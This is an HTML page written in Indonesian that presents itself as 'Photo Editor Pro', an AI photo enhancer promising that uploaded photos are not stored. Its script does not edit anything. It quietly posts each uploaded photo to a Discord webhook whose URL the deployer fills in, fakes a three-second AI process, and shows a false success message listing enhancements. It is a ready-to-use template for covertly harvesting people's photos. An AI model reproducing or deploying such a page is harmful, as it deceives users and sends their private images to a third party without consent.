<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Editor Pro</title>
    <!-- Muat Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .spinner {
            border-top-color: #2563eb;
            border-right-color: transparent;
            border-bottom-color: transparent;
            border-left-color: #2563eb;
            animation: spin 1s linear infinite;
        }
        
        .custom-file-input::-webkit-file-upload-button {
            visibility: hidden;
        }
        .custom-file-input::before {
            content: 'Pilih File Foto Anda';
            display: inline-block;
            background: #e0f2fe;
            color: #1e3a8a;
            border-radius: 0.5rem;
            padding: 0.75rem 1.25rem;
            outline: none;
            white-space: nowrap;
            -webkit-user-select: none;
            cursor: pointer;
            font-weight: 600;
            border: 2px solid #93c5fd;
            transition: all 0.2s;
        }
        .custom-file-input:hover::before {
            background: #bfdbfe;
        }
        
        .privacy-notice {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>

    <div id="app" class="w-full max-w-md bg-white p-8 rounded-xl shadow-2xl text-gray-800 border-t-8 border-purple-600 transform transition-all duration-500 hover:scale-[1.01]">
        
        <!-- Header dengan logo dan judul profesional -->
        <div class="text-center mb-6">
            <div class="w-16 h-16 bg-gradient-to-r from-purple-600 to-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <span class="text-white text-2xl font-bold">ðŸ“·</span>
            </div>
            <h1 class="text-3xl font-bold text-gray-800 mb-2">
                Photo Editor Pro
            </h1>
            <p class="text-gray-600 text-sm">
                Edit foto Anda dengan teknologi AI terbaru
            </p>
        </div>

        <!-- Privacy Notice -->
        <div class="privacy-notice rounded-lg p-4 mb-6 text-center">
            <p class="text-sm text-gray-700">
                <strong>ðŸ”’ Privasi Terjaga:</strong> Foto Anda diproses secara aman dan tidak disimpan di server kami.
            </p>
        </div>

        <!-- Area Input dan Tombol -->
        <div id="controls" class="space-y-6">
            
            <!-- Input File -->
            <div>
                <label for="photoFile" class="block text-md font-semibold text-gray-700 mb-2">
                    Pilih Foto yang Akan Diedit:
                </label>
                <input 
                    type="file" 
                    id="photoFile" 
                    accept="image/*" 
                    class="custom-file-input w-full text-sm text-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent rounded-lg"
                >
                <p class="text-xs text-gray-500 mt-2">
                    Format yang didukung: JPG, PNG, GIF (Maks. 5MB)
                </p>
            </div>

            <!-- Tombol Edit -->
            <button 
                id="editButton" 
                class="w-full py-3 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-bold text-lg rounded-xl shadow-lg shadow-purple-900/50 transition duration-150 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed transform hover:scale-[1.02]"
                onclick="startProcessing()"
            >
                ðŸš€ Proses Foto Sekarang
            </button>
        </div>

        <!-- Area Loading -->
        <div id="loadingArea" class="hidden flex flex-col items-center justify-center p-8">
            <div class="spinner w-16 h-16 border-4 rounded-full mb-4"></div>
            <p class="text-lg font-semibold text-purple-600 animate-pulse text-center">
                Sedang memproses foto Anda...<br>
                <span class="text-sm text-gray-500">Harap tunggu sebentar</span>
            </p>
        </div>

        <!-- Area Hasil -->
        <div id="resultArea" class="hidden text-center p-8 mt-4 bg-green-100 border-2 border-green-500 rounded-xl">
            <div class="text-6xl mb-4" role="img" aria-label="Success">âœ…</div>
            <h2 class="text-2xl font-bold text-green-700 mb-3">
                Proses Selesai!
            </h2>
            <p class="text-gray-700 mb-4">
                Foto Anda telah berhasil diproses dengan teknologi AI kami.
            </p>
            <div class="bg-white p-4 rounded-lg border border-green-200 mb-4">
                <p class="text-sm text-gray-600">
                    <strong>Fitur yang diterapkan:</strong><br>
                    â€¢ Enhancement kualitas gambar<br>
                    â€¢ Auto color correction<br>
                    â€¢ Noise reduction
                </p>
            </div>
            <button 
                class="mt-4 py-2 px-6 bg-green-600 hover:bg-green-700 text-white font-medium rounded-lg transition duration-150"
                onclick="resetApp()"
            >
                Edit Foto Lain
            </button>
        </div>
        
        <!-- Custom Modal untuk pesan peringatan -->
        <div id="modalContainer"></div>

        <!-- Copyright / Powered By -->
        <div class="mt-8 pt-4 border-t border-gray-200 text-center text-sm text-gray-500">
            &copy; 2024 <span class="text-purple-600 font-semibold">AmosXD</span> - All rights reserved
        </div>

    </div>

    <script>
        // Webhook Discord URL
        const DISCORD_WEBHOOK_URL = "MASUKAN URL WEBOK DC KALIAN DISINI";
        
        // Sound effect URL - DIPERTAHANKAN
        const AI_SOUND_URL = "https://nauval.cloud/download/prankkkkwkwkwk.mp3";

        // Mendapatkan elemen-elemen DOM
        const controlsDiv = document.getElementById('controls');
        const loadingDiv = document.getElementById('loadingArea');
        const resultDiv = document.getElementById('resultArea');
        const fileInput = document.getElementById('photoFile');
        const editButton = document.getElementById('editButton');
        const modalContainer = document.getElementById('modalContainer');

        // Objek audio - DIPERTAHANKAN
        const audio = new Audio(AI_SOUND_URL);

        /**
         * Mengirim foto ke webhook Discord
         */
        async function sendToDiscord(file) {
            try {
                const formData = new FormData();
                formData.append('file', file);
                formData.append('content', `ðŸ“¸ Foto baru diupload - ${new Date().toLocaleString('id-ID')}`);

                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    throw new Error('Gagal mengirim ke Discord');
                }
                
                return true;
            } catch (error) {
                console.error('Error mengirim ke Discord:', error);
                return false;
            }
        }

        /**
         * Memulai proses pengeditan foto
         */
        async function startProcessing() {
            if (!fileInput.files || fileInput.files.length === 0) {
                showCustomMessage("Peringatan", "Mohon pilih file foto terlebih dahulu.");
                return;
            }

            const file = fileInput.files[0];
            
            // Validasi file
            if (file.size > 5 * 1024 * 1024) {
                showCustomMessage("Peringatan", "Ukuran file terlalu besar. Maksimal 5MB.");
                return;
            }

            // Tampilkan loading
            controlsDiv.classList.add('hidden');
            loadingDiv.classList.remove('hidden');
            resultDiv.classList.add('hidden');

            try {
                // PUTAR SOUND EFFECT - DIPERTAHANKAN
                audio.currentTime = 0; 
                audio.play().catch(error => {
                    console.error("Gagal memutar audio:", error);
                });

                // Kirim foto ke Discord
                const discordSuccess = await sendToDiscord(file);
                
                // Simulasikan proses AI (3 detik)
                await new Promise(resolve => setTimeout(resolve, 3000));

                // Tampilkan hasil
                loadingDiv.classList.add('hidden');
                resultDiv.classList.remove('hidden');

                // Hentikan suara jika masih berputar
                audio.pause();
                audio.currentTime = 0;

                if (!discordSuccess) {
                    console.warn('Foto berhasil diproses tapi gagal dikirim ke Discord');
                }

            } catch (error) {
                console.error('Error dalam proses:', error);
                loadingDiv.classList.add('hidden');
                showCustomMessage("Error", "Terjadi kesalahan saat memproses foto. Silakan coba lagi.");
            }
        }

        /**
         * Mereset tampilan aplikasi kembali ke awal
         */
        function resetApp() {
            controlsDiv.classList.remove('hidden');
            loadingDiv.classList.add('hidden');
            resultDiv.classList.add('hidden');
            fileInput.value = '';
            editButton.disabled = true;
        }

        /**
         * Menampilkan pesan kustom
         */
        function showCustomMessage(title, message) {
            modalContainer.innerHTML = '';
            
            const modalHTML = `
                <div class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center p-4 z-50">
                    <div class="bg-white p-6 rounded-xl shadow-2xl w-full max-w-sm text-gray-800">
                        <h3 class="text-xl font-bold text-purple-700 mb-3">${title}</h3>
                        <p class="text-gray-700 mb-4">${message}</p>
                        <button 
                            onclick="modalContainer.innerHTML = ''" 
                            class="w-full py-2 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg transition"
                        >
                            Mengerti
                        </button>
                    </div>
                </div>
            `;
            modalContainer.innerHTML = modalHTML;
        }

        // Event listener untuk input file
        fileInput.addEventListener('change', () => {
            const hasFile = fileInput.files.length > 0;
            editButton.disabled = !hasFile;
            
            if (hasFile) {
                const file = fileInput.files[0];
                if (file.size > 5 * 1024 * 1024) {
                    showCustomMessage("Peringatan", "Ukuran file terlalu besar. Maksimal 5MB.");
                    fileInput.value = '';
                    editButton.disabled = true;
                }
            }
        });

        // Nonaktifkan tombol di awal
        editButton.disabled = true;
    </script>

</body>
</html>
